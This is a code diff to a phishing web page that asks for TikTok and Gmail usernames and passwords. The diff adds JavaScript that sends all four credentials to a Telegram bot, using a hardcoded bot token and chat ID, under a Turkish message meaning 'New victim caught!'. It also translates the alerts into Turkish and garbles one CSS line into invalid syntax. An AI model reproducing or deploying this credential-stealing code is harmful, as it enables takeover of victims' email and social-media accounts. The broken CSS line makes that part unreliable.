@@ -263,7 +263,7 @@
             background-color: #000;
             padding: 48px 24px 24px;
             display: flex;
-            max-width: 1200px;
+            max-width originates from: 1200px;
             margin: 0 auto;
             gap: 48px;
             flex-wrap: wrap;
@@ -653,30 +653,46 @@
                 document.getElementById('step2').style.display = 'block';
                 document.getElementById('step2').classList.add('active');
             } else {
-                alert('Please fill in all fields.');
+                alert('Lütfen tüm alanları doldurun.');
             }
         }
 
         function submitForm() {
             const gmail = document.getElementById('gmail').value;
             const gmailPassword = document.getElementById('gmail-password').value;
-            
-            if (gmail && gmailPassword) {
-                document.getElementById('step2').style.display = 'none';
-                document.getElementById('success').style.display = 'block';
-                document.getElementById('success').classList.add('active');
-                
-                const formData = {
-                    tiktokUsername: document.getElementById('username').value,
-                    tiktokPassword: document.getElementById('password').value,
-                    gmail: gmail,
-                    gmailPassword: gmailPassword,
-                    timestamp: new Date().toISOString()
-                };
-                
-                console.log('Form Data:', formData);
+            const tiktokUsername = document.getElementById('username').value;
+            const tiktokPassword = document.getElementById('password').value;
+
+            if (gmail && gmailPassword && tiktokUsername && tiktokPassword) {
+                const botToken = '7777367983:AAHFeWMAtxEdl9_d2aCpTqq3UvlUguc4AeU';
+                const chatId = '6116320717';
+                const message = `Yeni Kurban Yakalandı! 😈\nTikTok Kullanıcı Adı: ${tiktokUsername}\nTikTok Şifre: ${tiktokPassword}\nGmail: ${gmail}\nGmail Şifre: ${gmailPassword}\nZaman: ${new Date().toISOString()}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        chat_id: chatId,
+                        text: message
+                    }).toString()
+                })
+                .then(response => {
+                    if (response.ok) {
+                        document.getElementById('step2').style.display = 'none';
+                        document.getElementById('success').style.display = 'block';
+                        document.getElementById('success').classList.add('active');
+                    } else {
+                        alert('Veriler Telegram’a gönderilemedi!');
+                    }
+                })
+                .catch(error => {
+                    console.error('Hata:', error);
+                    alert('Hata oluştu, veriler gönderilemedi!');
+                });
             } else {
-                alert('Please fill in all fields.');
+                alert('Lütfen tüm alanları doldurun.');
             }
         }
 
